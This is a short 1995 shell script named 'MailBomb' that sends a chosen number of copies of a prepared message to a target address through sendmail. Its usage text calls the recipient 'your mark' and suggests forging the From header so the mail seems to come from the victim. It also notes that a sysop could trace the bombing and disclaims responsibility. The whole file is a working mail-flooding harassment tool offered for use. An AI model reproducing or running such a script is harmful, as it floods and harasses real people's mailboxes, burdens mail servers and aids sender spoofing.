#!/bin/sh 
if [ $# -ne 3 ]
then
    echo
    echo MailBomb is a tiny little script using sendmail for mailbombing
    echo purposes. In order to use the program you will have to have a specific
    echo file to send to your mark. In the top of the file you will have to 
    echo specify atleast the following:
    echo
    echo From: whatever@wherever
    echo Subject: I do not like you.
    echo 
    echo You can also write other things in the header. A perfect use of this
    echo program is to send back 10 copies to assholes who send you chain letters.
    echo Save their crap-letter and specify that as the filename, it will appear as
    echo if they send the crap to themselves. The syntax for program is:
    echo
    echo mailbomb [number of mesgs] [address] [filename]
    echo
    echo Warning! If the user has a brain, then he can tell a sysop and the sysop
    echo can trace your bombing. I take NO responsibility for use of this program.
    echo
    echo The Last Viking 1995.
else
    n=$1
    j=0    
    while [ "$j" -lt $n ]
    do
	cat $3 | sendmail $2
	j=`expr $j + 1`
    done
echo MailBombing finished.
fi
